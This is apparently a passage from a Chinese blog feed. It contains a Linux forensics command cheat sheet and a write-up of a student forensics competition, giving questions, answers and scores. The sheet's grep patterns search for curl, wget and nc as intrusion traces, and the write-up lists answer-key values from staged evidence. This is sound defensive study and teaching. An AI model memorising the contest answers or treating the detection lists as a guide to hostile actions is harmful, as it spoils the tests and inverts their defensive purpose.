href="https://volatility3.readthedocs.io/en/latest/">https://volatility3.readthedocs.io/en/latest/</a></li><li>Volatility 3 仓库：<a href="https://github.com/volatilityfoundation/volatility3">https://github.com/volatilityfoundation/volatility3</a></li></ul></li><li>NIST 指南<ul><li>NIST SP 800-86《Guide to Integrating Forensic Techniques into Incident Response》：<a href="https://csrc.nist.gov/publications/detail/sp/800-86/final">https://csrc.nist.gov/publications/detail/sp/800-86/final</a></li></ul></li><li>Windows 事件日志<ul><li>Windows Event Log（Win32 API）概览：<a href="https://learn.microsoft.com/windows/win32/wes/windows-event-log">https://learn.microsoft.com/windows/win32/wes/windows-event-log</a></li><li>Windows 事件日志 API（<code>winevt</code>）：<a href="https://learn.microsoft.com/windows/win32/api/winevt/">https://learn.microsoft.com/windows/win32/api/winevt/</a></li></ul></li><li>SRUM / srumutil<ul><li><code>powercfg</code> 命令行选项（含 <code>/srumutil</code>）：<a href="https://learn.microsoft.com/windows-hardware/design/device-experiences/powercfg-command-line-options">https://learn.microsoft.com/windows-hardware/design/device-experiences/powercfg-command-line-options</a></li><li>Eric Zimmerman 工具页面（含 SrumECmd）：<a href="https://ericzimmerman.github.io/">https://ericzimmerman.github.io/</a></li></ul></li><li>Amcache / ShimCache（AppCompatCache）<ul><li>AmcacheParser（Eric Zimmerman）：<a href="https://github.com/EricZimmerman/AmcacheParser">https://github.com/EricZimmerman/AmcacheParser</a></li><li>AppCompatCacheParser（Eric Zimmerman）：<a href="https://github.com/EricZimmerman/AppCompatCacheParser">https://github.com/EricZimmerman/AppCompatCacheParser</a></li><li>Mandiant《Know Your ShimCache》：<a href="https://www.mandiant.com/resources/blog/know-your-shimcache">https://www.mandiant.com/resources/blog/know-your-shimcache</a></li></ul></li><li>Linux 日志与命令<ul><li>systemd-journald 服务手册（man7）：<a href="https://man7.org/linux/man-pages/man8/systemd-journald.service.8.html">https://man7.org/linux/man-pages/man8/systemd-journald.service.8.html</a></li><li>journalctl 命令手册（man7）：<a href="https://man7.org/linux/man-pages/man1/journalctl.1.html">https://man7.org/linux/man-pages/man1/journalctl.1.html</a></li><li>last（读取 wtmp）手册（man7）：<a href="https://man7.org/linux/man-pages/man1/last.1.html">https://man7.org/linux/man-pages/man1/last.1.html</a></li><li>lastlog 手册（man7）：<a href="https://man7.org/linux/man-pages/man8/lastlog.8.html">https://man7.org/linux/man-pages/man8/lastlog.8.html</a></li><li>auditd 手册（man7）：<a href="https://man7.org/linux/man-pages/man8/auditd.8.html">https://man7.org/linux/man-pages/man8/auditd.8.html</a></li></ul></li></ul><hr><p><strong>使用提示</strong></p><ul><li>将上述命令与工具按“时间线驱动”整合：先确立系统时间、启动序列，再定位登录与执行、网络与驻留，最后关联文件与注册表工件。</li><li>每个工件都记录采集方式与哈希；报告中引用相应权威文档以确保可验证性与可复查性。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux命令</title>
      <link href="/2025/10/23/linux%E5%91%BD%E4%BB%A4/"/>
      <url>/2025/10/23/linux%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p><strong>取证注意事项</strong></p><ul><li>优先只读访问：对磁盘镜像或分区使用只读挂载（示例见“磁盘与镜像”）</li><li>保持时间一致：设置统一时区和本地化避免输出差异，例如 <code>TZ=UTC LC_ALL=C</code></li><li>先校验后操作：所有采集文件和镜像务必做哈希校验保存（见“哈希与完整性”）</li></ul><hr><h2 id="文件与元数据"><a class="header-anchor" href="#文件与元数据">¶</a>文件与元数据</h2><ul><li><p><code>pwd</code></p><ul><li>作用：明确当前工作目录，记录操作上下文</li><li>示例：<code>pwd</code></li></ul></li><li><p><code>ls</code></p><ul><li>作用：浏览目录与隐藏文件，关注时间戳、权限、所有者</li><li>示例：<code>ls -al --time-style=full-iso</code></li></ul></li><li><p><code>stat</code></p><ul><li>作用：查看文件详细时间戳（atime/mtime/ctime/birth）、权限、大小</li><li>示例：<code>stat -c '%n %s bytes | atime:%x mtime:%y ctime:%z' /path/to/file</code></li></ul></li><li><p><code>file</code></p><ul><li>作用：识别文件类型与魔术字，用于发现伪装扩展名或嵌套数据</li><li>示例：<code>file suspicious.bin</code></li></ul></li><li><p><code>find</code></p><ul><li>作用：全盘检索、时间线筛选、权限异常扫描（如 SUID）</li><li>示例：<code>find / -xdev -type f -newermt '2025-10-20'</code><br><code>find / -xdev -perm -4000 -type f -ls</code></li></ul></li><li><p><code>grep</code></p><ul><li>作用：模式匹配检索关键字、IOC、可疑路径或命令痕迹</li><li>示例：<code>grep -R --line-number --binary-files=without-match -i 'curl|wget|nc' /etc /var /home</code></li></ul></li></ul><hr><h2 id="内容提取与十六进制"><a class="header-anchor" href="#内容提取与十六进制">¶</a>内容提取与十六进制</h2><ul><li><p><code>strings</code></p><ul><li>作用：从二进制中抽取 ASCII/Unicode 字符串，快速发现域名、路径、密钥</li><li>示例：<code>strings -n 8 sample.bin | grep -i 'http\|token\|passwd'</code></li></ul></li><li><p><code>xxd</code> / <code>hexdump</code></p><ul><li>作用：十六进制查看、偏移定位、签名验证</li><li>示例：<code>xxd -g 1 -l 512 disk.img</code><br><code>hexdump -C suspicious.dat | head</code></li></ul></li><li><p><code>cat</code> / <code>less</code> / <code>head</code> / <code>tail</code></p><ul><li>作用：查看文本与日志，<code>tail -f</code>用于实时监控</li><li>示例：<code>less /var/log/auth.log</code><br><code>tail -n 200 /var/log/syslog</code></li></ul></li><li><p><code>wc</code> / <code>sort</code> / <code>uniq</code> / <code>cut</code></p><ul><li>作用：日志与列表的统计、去重与字段裁剪，辅助分析大批量条目</li><li>示例：<code>cut -d' ' -f1 ip_list.txt | sort | uniq -c | sort -nr</code></li></ul></li><li><p><code>diff</code></p><ul><li>作用：比较配置或文件差异，确认未授权变更</li><li>示例：<code>diff -u /etc/ssh/sshd_config /mnt/baseline/sshd_config</code></li></ul></li></ul><hr><h2 id="日志与账户活动"><a class="header-anchor" href="#日志与账户活动">¶</a>日志与账户活动</h2><ul><li><p><code>journalctl</code></p><ul><li>作用：systemd 日志查询，按时间与单元过滤</li><li>示例：<code>journalctl --since '2025-10-20' --until '2025-10-23' -u ssh</code></li></ul></li><li><p>常见日志路径</p><ul><li>作用：定位系统与安全日志（发行版有差异）</li><li>示例：<code>/var/log/auth.log</code><br><code>/var/log/secure</code><br><code>/var/log/syslog</code><br><code>/var/log/messages</code></li></ul></li><li><p><code>last</code> / <code>lastlog</code> / <code>who</code> / <code>w</code></p><ul><li>作用：登录历史、当前在线用户、会话活动</li><li>示例：<code>last -F | head</code><br><code>lastlog</code><br><code>w</code></li></ul></li><li><p><code>history</code></p><ul><li>作用：Shell 历史命令（注意可能被清理或伪造）</li><li>示例：<code>cat ~/.bash_history</code></li></ul></li></ul><hr><h2 id="进程与网络"><a class="header-anchor" href="#进程与网络">¶</a>进程与网络</h2><ul><li><p><code>ps</code> / <code>top</code> / <code>htop</code></p><ul><li>作用：进程枚举、资源占用、可疑子进程分析</li><li>示例：<code>ps aux --sort=-%cpu | head</code></li></ul></li><li><p><code>lsof</code></p><ul><li>作用：列出进程打开的文件/端口，确认数据外泄或持久化文件句柄</li><li>示例：<code>lsof -i -P -n</code><br><code>lsof +L1</code>（查找已删除但仍被占用的文件）</li></ul></li><li><p><code>ss</code> / <code>netstat</code></p><ul><li>作用：网络连接与监听端口，识别可疑外联</li><li>示例：<code>ss -tulpen</code><br><code>netstat -ano</code>（旧系统）</li></ul></li><li><p><code>ip</code> / <code>ifconfig</code></p><ul><li>作用：网卡与地址信息，检查异常路由或配置</li><li>示例：<code>ip addr</code><br><code>ip route</code></li></ul></li><li><p><code>iptables</code> / <code>nft</code></p><ul><li>作用：防火墙规则检查，识别临时后门转发</li><li>示例：<code>iptables -L -n -v</code><br><code>nft list ruleset</code></li></ul></li></ul><hr><h2 id="磁盘与镜像（保全证据）"><a class="header-anchor" href="#磁盘与镜像（保全证据）">¶</a>磁盘与镜像（保全证据）</h2><ul><li><p><code>dd</code></p><ul><li>作用：位复制创建磁盘/分区镜像，保全原始证据</li><li>示例：<code>dd if=/dev/sda of=/evidence/disk.img bs=4M conv=noerror,sync status=progress</code></li></ul></li><li><p><code>dcfldd</code> / <code>ddrescue</code>（如已安装）</p><ul><li>作用：更适合取证的哈希与错误处理、坏盘救援</li><li>示例：<code>ddrescue -f -n /dev/sda /evidence/disk.img /evidence/mapfile</code></li></ul></li><li><p>只读挂载镜像</p><ul><li>作用：避免污染证据，便于浏览文件系统</li><li>示例：<code>mount -o ro,loop,noexec,nodev,nosuid disk.img /mnt/evidence</code></li></ul></li><li><p>分区与块设备</p><ul><li>作用：识别设备与分区布局</li><li>示例：<code>lsblk -f</code><br><code>blkid</code><br><code>fdisk -l</code></li></ul></li></ul><hr><h2 id="哈希与完整性"><a class="header-anchor" href="#哈希与完整性">¶</a>哈希与完整性</h2><ul><li><p><code>md5sum</code> / <code>sha1sum</code> / <code>sha256sum</code></p><ul><li>作用：生成与核对哈希，保证采集与分析文件的完整性</li><li>示例：<code>sha256sum /evidence/disk.img &gt; /evidence/disk.img.sha256</code><br><code>sha256sum -c /evidence/disk.img.sha256</code></li></ul></li><li><p><code>shasum</code></p><ul><li>作用：多种哈希摘要接口（依发行版）</li><li>示例：<code>shasum -a 512 file.bin</code></li></ul></li></ul><hr><h2 id="权限与持久化"><a class="header-anchor" href="#权限与持久化">¶</a>权限与持久化</h2><ul><li><p><code>chmod</code> / <code>chown</code> / <code>chgrp</code></p><ul><li>作用：审查或修正权限（取证时通常只读，不建议修改现场）</li><li>示例：<code>ls -l /etc/cron.d</code> 检查权限异常</li></ul></li><li><p>SUID/SGID 检查</p><ul><li>作用：查找可能被滥用的提权二进制</li><li>示例：<code>find / -xdev -perm -4000 -type f -ls</code><br><code>find / -xdev -perm -2000 -type f -ls</code></li></ul></li><li><p>Cron 与 systemd 持久化</p><ul><li>作用：发现后门任务或自启动服务</li><li>示例：<code>ls -al /etc/cron.* /var/spool/cron</code><br><code>ls -al /etc/systemd/system</code><br><code>systemctl list-timers</code></li></ul></li><li><p>SSH 授权与密钥</p><ul><li>作用：确认未授权公钥或配置变更</li><li>示例：<code>cat /root/.ssh/authorized_keys</code><br><code>grep -R 'PermitRootLogin' /etc/ssh/sshd_config</code></li></ul></li></ul><hr><h2 id="系统信息与环境"><a class="header-anchor" href="#系统信息与环境">¶</a>系统信息与环境</h2><ul><li><p><code>uname</code> / <code>hostnamectl</code></p><ul><li>作用：系统内核、主机名、平台指纹</li><li>示例：<code>uname -a</code><br><code>hostnamectl</code></li></ul></li><li><p><code>date</code></p><ul><li>作用：确认系统时间与时区（建议统一为 UTC）</li><li>示例：<code>TZ=UTC date -Iseconds</code></li></ul></li><li><p><code>which</code> / <code>whereis</code> / <code>locate</code></p><ul><li>作用：定位可执行文件与资源路径，发现替换或影子副本</li><li>示例：<code>which ssh</code><br><code>whereis python</code><br><code>updatedb &amp;&amp; locate suspicious</code></li></ul></li><li><p><code>df</code> / <code>du</code></p><ul><li>作用：磁盘使用与异常增长定位</li><li>示例：<code>df -h</code><br><code>du -h -d1 /var | sort -hr | head</code></li></ul></li></ul><hr><h2 id="压缩与归档"><a class="header-anchor" href="#压缩与归档">¶</a>压缩与归档</h2><ul><li><p><code>tar</code> / <code>gzip</code> / <code>bzip2</code> / <code>xz</code></p><ul><li>作用：打包证据与日志，保持目录结构与时间戳（注意只读源）</li><li>示例：<code>tar -c --numeric-owner --xattrs --acls -zf logs.tar.gz /var/log</code></li></ul></li><li><p><code>zip</code> / <code>7z</code>（如已安装）</p><ul><li>作用：跨平台归档与加密</li><li>示例：<code>7z a -t7z -mhe=on -p'StrongPass' evidence.7z /evidence</code></li></ul></li></ul><hr><h2 id="文本处理（现场快速分析）"><a class="header-anchor" href="#文本处理（现场快速分析）">¶</a>文本处理（现场快速分析）</h2><ul><li><p><code>awk</code></p><ul><li>作用：结构化提取字段、做轻量聚合</li><li>示例：<code>awk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -nr</code></li></ul></li><li><p><code>sed</code></p><ul><li>作用：行级替换与过滤，清洗日志内容</li><li>示例：<code>sed -n 's/Failed password/FAILED/p' /var/log/auth.log</code></li></ul></li></ul><hr><h2 id="证据传输与记录"><a class="header-anchor" href="#证据传输与记录">¶</a>证据传输与记录</h2><ul><li><p><code>scp</code> / <code>rsync</code></p><ul><li>作用：安全传输采集材料，与校验结合</li><li>示例：<code>rsync -av --progress /evidence user@host:/secure/evidence</code></li></ul></li><li><p>命令输出记录</p><ul><li>作用：保存取证过程与链路，便于复核</li><li>示例：<code>script -t 2&gt;timing.log -a session.log</code>（记录交互会话）</li></ul></li></ul><hr><h2 id="快速清单（可直接复制执行的实用片段）"><a class="header-anchor" href="#快速清单（可直接复制执行的实用片段）">¶</a>快速清单（可直接复制执行的实用片段）</h2><ul><li><p>只读查看系统关键信息</p><ul><li><pre><code></code></pre></li></ul><p>TZ=UTC LC_ALL=C uname -a<br>TZ=UTC LC_ALL=C date -Iseconds<br>ls -al --time-style=full-iso /etc /var/log /home</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 登录与可疑命令痕迹</span><br><span class="line">  - ```</span><br><span class="line">  last -F | head</span><br><span class="line">  cat ~/.bash_history | tail -n 50</span><br><span class="line">  grep -R -n -i &#x27;curl\|wget\|nc\|ssh&#x27; /etc /var /home</span><br></pre></td></tr></table></figure></li><li><p>网络与进程基线</p><ul><li><pre><code></code></pre></li></ul><p>ss -tulpen<br>ps aux --sort=-%cpu | head<br>lsof -i -P -n</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- SUID 与持久化检查</span><br><span class="line">  - ```</span><br><span class="line">  find / -xdev -perm -4000 -type f -ls</span><br><span class="line">  ls -al /etc/cron.* /var/spool/cron</span><br><span class="line">  ls -al /etc/systemd/system</span><br></pre></td></tr></table></figure></li><li><p>日志与关键信息提取</p><ul><li><pre><code></code></pre></li></ul><p>journalctl --since ‘2025-10-20’ --until ‘2025-10-23’ -u ssh<br>tail -n 200 /var/log/auth.log<br>awk ‘{print $1}’ /var/log/auth.log | sort | uniq -c | sort -nr</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 镜像保全与校验</span><br><span class="line">  - ```</span><br><span class="line">  dd if=/dev/sda of=/evidence/disk.img bs=4M conv=noerror,sync status=progress</span><br><span class="line">  sha256sum /evidence/disk.img &gt; /evidence/disk.img.sha256</span><br><span class="line">  mount -o ro,loop,noexec,nodev,nosuid /evidence/disk.img /mnt/evidence</span><br></pre></td></tr></table></figure></li></ul><hr><p><strong>小结</strong></p><ul><li>以上命令覆盖大多数基础取证需求：现场勘验、时间线分析、日志与网络进程审查、证据保全与校验。</li><li>现场操作请遵循只读、统一时区、全程记录与哈希校验的原则，必要时使用更专业工具（如 <code>ddrescue</code>、Sleuth Kit）。</li></ul><h2 id="Linux-忘记密码解决方法"><a class="header-anchor" href="#Linux-忘记密码解决方法">¶</a>Linux 忘记密码解决方法</h2><p><img src="/img/linux%E5%91%BD%E4%BB%A4_image.png" alt="alt text"></p><h2 id="Linux-文件与目录管理"><a class="header-anchor" href="#Linux-文件与目录管理">¶</a>Linux 文件与目录管理</h2><p><img src="/img/linux%E5%91%BD%E4%BB%A4_image.png" alt="alt text"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SPC新生赛即美亚杯选拔赛</title>
      <link href="/2025/10/23/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B/"/>
      <url>/2025/10/23/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="致谢"><a class="header-anchor" href="#致谢">¶</a>致谢</h2><ul><li>感谢cty学姐和dh学长的帮助！！</li><li>拿到了蛮好的成绩嘿嘿嘿开心，但也要认真复盘ヽ( <sup>ω</sup> ゞ )</li></ul><blockquote><p>题目来源：某省刑侦个⼈</p></blockquote><h2 id="手机取证"><a class="header-anchor" href="#手机取证">¶</a>手机取证</h2><h3 id="6-【填空题】分析嫌疑人的手机，应用“备忘录记事”中记录了多少年龄小于30岁的人员信息？（答案格式：123）"><a class="header-anchor" href="#6-【填空题】分析嫌疑人的手机，应用“备忘录记事”中记录了多少年龄小于30岁的人员信息？（答案格式：123）">¶</a>6.【填空题】分析嫌疑人的手机，应用“备忘录记事”中记录了多少年龄小于30岁的人员信息？（答案格式：123）</h3><p>正确答案：<br>4<br>分值：1分</p><ul><li>火眼 耗时任务 其他应用 这题没用</li><li>火眼-文件-直接找包名sql文件<ul><li>注意有两页哦</li></ul></li><li>X-ways 方法同火眼<ul><li>注意文件打开按钮按下面那个</li></ul></li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-1.png" alt="alt text"></p><ul><li>编码调整</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-2.png" alt="alt text"></p><h3 id="8-【单选题】分析嫌疑人的手机，嫌疑人使用文档扫描软件扫描的文件内容是什么？（-）"><a class="header-anchor" href="#8-【单选题】分析嫌疑人的手机，嫌疑人使用文档扫描软件扫描的文件内容是什么？（-）">¶</a>8.【单选题】分析嫌疑人的手机，嫌疑人使用文档扫描软件扫描的文件内容是什么？（ ）</h3><p>A. 提成分红记录<br>B. 诈骗业绩指标<br>C. 伪装身份话术<br>D. 人员名单<br>【正确答案】C. 伪装身份话术<br>分值：1分</p><ul><li>火眼-文件-直接找包名文件夹内-temp图片</li><li>X-way同</li></ul><h3 id="9-【填空题】分析嫌疑人的手机，嫌疑人使用的名称为“薄荷记账”的记账软件共记录了多少笔交易？（答案格式：123）"><a class="header-anchor" href="#9-【填空题】分析嫌疑人的手机，嫌疑人使用的名称为“薄荷记账”的记账软件共记录了多少笔交易？（答案格式：123）">¶</a>9.【填空题】分析嫌疑人的手机，嫌疑人使用的名称为“薄荷记账”的记账软件共记录了多少笔交易？（答案格式：123）</h3><p>正确答案：<br>13<br>分值：1分</p><ul><li>X-ways<ul><li>递归操作：一般在操作栏左侧选中你需要的文件右键，就把树状结构拍成一个平面</li><li>打开文件最好解压缩后打开文件夹，不然可能解压错误<br><a href="/2025/10/27/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B%E4%BF%9D%E5%AF%86%E9%83%A8%E5%88%86">保密部分</a><br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-3.png" alt="alt text"></li></ul></li></ul><h3 id="10-【填空题】分析嫌疑人的手机，该记账软件中关于诈骗提成分红的收入明细一共多少钱？（答案格式：123）"><a class="header-anchor" href="#10-【填空题】分析嫌疑人的手机，该记账软件中关于诈骗提成分红的收入明细一共多少钱？（答案格式：123）">¶</a>10.【填空题】分析嫌疑人的手机，该记账软件中关于诈骗提成分红的收入明细一共多少钱？（答案格式：123）</h3><p>正确答案：<br>3281<br>分值：1分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-4.png" alt="alt text"></p><h2 id="计算机取证"><a class="header-anchor" href="#计算机取证">¶</a>计算机取证</h2><h3 id="4-【填空题】分析嫌疑人的电脑，其电脑BitLocker加密分区的48位恢复密钥的后六位是多少？（答案格式：123456）"><a class="header-anchor" href="#4-【填空题】分析嫌疑人的电脑，其电脑BitLocker加密分区的48位恢复密钥的后六位是多少？（答案格式：123456）">¶</a>4.【填空题】分析嫌疑人的电脑，其电脑BitLocker加密分区的48位恢复密钥的后六位是多少？（答案格式：123456）</h3><p>正确答案：<br>200189<br>分值：2分</p><ul><li>查找方式：<ul><li>1 明文 2 内存（mem后缀）</li></ul></li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-6.png" alt="alt text"><br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-7.png" alt="alt text"></p><ul><li>170258-643148-669911-174548-088726-299772-219439-200189</li></ul><h3 id="7-【填空题】分析嫌疑人的电脑，嫌疑人使用的苹果手机序列号是多少？（答案格式：ABCD1234）"><a class="header-anchor" href="#7-【填空题】分析嫌疑人的电脑，嫌疑人使用的苹果手机序列号是多少？（答案格式：ABCD1234）">¶</a>7.【填空题】分析嫌疑人的电脑，嫌疑人使用的苹果手机序列号是多少？（答案格式：ABCD1234）</h3><p>正确答案：<br>C8PZFDJXN741<br>分值：2分</p><ul><li>plist后缀文件记录苹果基础信息</li><li>C8PZFDJXN741</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-8.png" alt="alt text"></p><h3 id="8-【填空题】分析嫌疑人的电脑，嫌疑人曾使用的苹果手机备份四位数字密码是多少？（答案格式：1234）【待】"><a class="header-anchor" href="#8-【填空题】分析嫌疑人的电脑，嫌疑人曾使用的苹果手机备份四位数字密码是多少？（答案格式：1234）【待】">¶</a>8.【填空题】分析嫌疑人的电脑，嫌疑人曾使用的苹果手机备份四位数字密码是多少？（答案格式：1234）【待】</h3><p>正确答案：<br>0122<br>分值：2分</p><h3 id="9-【填空题】分析嫌疑人的电脑，嫌疑人使用的以太坊钱包名称是什么？（答案格式：AbcDe）"><a class="header-anchor" href="#9-【填空题】分析嫌疑人的电脑，嫌疑人使用的以太坊钱包名称是什么？（答案格式：AbcDe）">¶</a>9.【填空题】分析嫌疑人的电脑，嫌疑人使用的以太坊钱包名称是什么？（答案格式：AbcDe）</h3><p>正确答案：<br>MetaMask<br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-9.png" alt="alt text"></p><h3 id="10-【填空题】分析嫌疑人的电脑，嫌疑人使用的以太坊钱包版本是多少？（答案格式：26-16-0）"><a class="header-anchor" href="#10-【填空题】分析嫌疑人的电脑，嫌疑人使用的以太坊钱包版本是多少？（答案格式：26-16-0）">¶</a>10.【填空题】分析嫌疑人的电脑，嫌疑人使用的以太坊钱包版本是多少？（答案格式：26.16.0）</h3><p>正确答案：<br>12.13.0<br>分值：2分</p><h3 id="11-【填空题】分析嫌疑人的电脑，嫌疑人的以太坊钱包私钥助记词第4个单词是什么？（答案格式：以实际为准）"><a class="header-anchor" href="#11-【填空题】分析嫌疑人的电脑，嫌疑人的以太坊钱包私钥助记词第4个单词是什么？（答案格式：以实际为准）">¶</a>11.【填空题】分析嫌疑人的电脑，嫌疑人的以太坊钱包私钥助记词第4个单词是什么？（答案格式：以实际为准）</h3><p>正确答案：<br>cloud<br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-11.png" alt="alt text"><br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-10.png" alt="alt text"></p><h3 id="12-【填空题】分析嫌疑人的电脑，嫌疑人的Skype账号是多少？（答案格式：以实际为准）"><a class="header-anchor" href="#12-【填空题】分析嫌疑人的电脑，嫌疑人的Skype账号是多少？（答案格式：以实际为准）">¶</a>12.【填空题】分析嫌疑人的电脑，嫌疑人的Skype账号是多少？（答案格式：以实际为准）</h3><p>正确答案：<br>live:.cid.d2bb7d5a13237f1d<br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-12.png" alt="alt text"></p><h3 id="14-【填空题】分析嫌疑人的电脑，嫌疑人电脑中安装的VPN软件名称是什么？（答案格式：Abc-VPN）"><a class="header-anchor" href="#14-【填空题】分析嫌疑人的电脑，嫌疑人电脑中安装的VPN软件名称是什么？（答案格式：Abc-VPN）">¶</a>14.【填空题】分析嫌疑人的电脑，嫌疑人电脑中安装的VPN软件名称是什么？（答案格式：Abc VPN）</h3><p>正确答案：<br>Any VPN<br>分值：2分</p><ul><li>注意开始界面啊！！有可能在中间哦</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-5.png" alt="alt text"></p><h3 id="16-【填空题】分析嫌疑人的电脑，该流量包开始抓取第一个分组的时间是什么？（答案格式：1900-01-01-01-00-00）"><a class="header-anchor" href="#16-【填空题】分析嫌疑人的电脑，该流量包开始抓取第一个分组的时间是什么？（答案格式：1900-01-01-01-00-00）">¶</a>16.【填空题】分析嫌疑人的电脑，该流量包开始抓取第一个分组的时间是什么？（答案格式：1900/01/01 01:00:00）</h3><p>正确答案：<br>2025/04/03 12:47:18<br>分值：2分</p><ul><li>文件：1仿真打开wireshark找到；2X-ways搜（复刻失败）3火眼搜（成功）</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-13.png" alt="alt text"></p><ul><li>暂时不理解这地方怎么搞先记下来</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-14.png" alt="alt text"></p><ul><li>要注意UTC哦</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-15.png" alt="alt text"></p><h3 id="17-【单选题】分析嫌疑人的电脑，抓取该流量包的总时长是？"><a class="header-anchor" href="#17-【单选题】分析嫌疑人的电脑，抓取该流量包的总时长是？">¶</a>17.【单选题】分析嫌疑人的电脑，抓取该流量包的总时长是？</h3><p>A. 00:02:14<br>B. 00:08:25<br>C. 00:18:25<br>D. 00:29:31<br>【正确答案】A. 00:02:14<br>分值：2分<br><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-15.png" alt="alt text"></p><ul><li>最后一个包</li></ul><p><img src="/img/SPC%E6%96%B0%E7%94%9F%E8%B5%9B%E5%8D%B3%E7%BE%8E%E4%BA%9A%E6%9D%AF%E9%80%89%E6%8B%94%E8%B5%9B_image-16.png" alt="alt text"></p><h3 id="18-【单选题】分析嫌疑人的电脑，该流量包中IPV4地址为3-24-46-4的占比是多少？"><a class="header-anchor" href="#18-【单选题】分析嫌疑人的电脑，该流量包中IPV4地址为3-24-46-4的占比是多少？">¶</a>18.【单选题】分析嫌疑人的电脑，该流量包中IPV4地址为3.24.46.4的占比是多少？</h3><p>A. 96.69%<br>B. 97.36%<br>C. 98.47%<br>D. 99.74%<br>【正确答案】D. 99.74%<br>分值：2分</p><ul><li>用python脚本解决</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">只输出指定协议或地址的占比：</span></span><br><span class="line"><span class="string">- 输入 pcap/pcapng 路径、协议名（如 TCP/UDP/HTTP/DNS/ICMP）、可选协议地址（仅 IPv4）</span></span><br><span class="line"><span class="string">- 仅打印一个数值：满足条件的占比（按字节占比），四舍五入到 4 位小数</span></span><br><span class="line"><span class="string">用法示例：</span></span><br><span class="line"><span class="string">python analyze_pcap.py &quot;E:/trace/example.pcapng&quot; TCP</span></span><br><span class="line"><span class="string">python analyze_pcap.py &quot;E:/trace/example.pcapng&quot; TCP 3.24.46.4</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> rdpcap, Packet</span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet <span class="keyword">import</span> IP, TCP, UDP, ICMP</span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet6 <span class="keyword">import</span> IPv6</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span 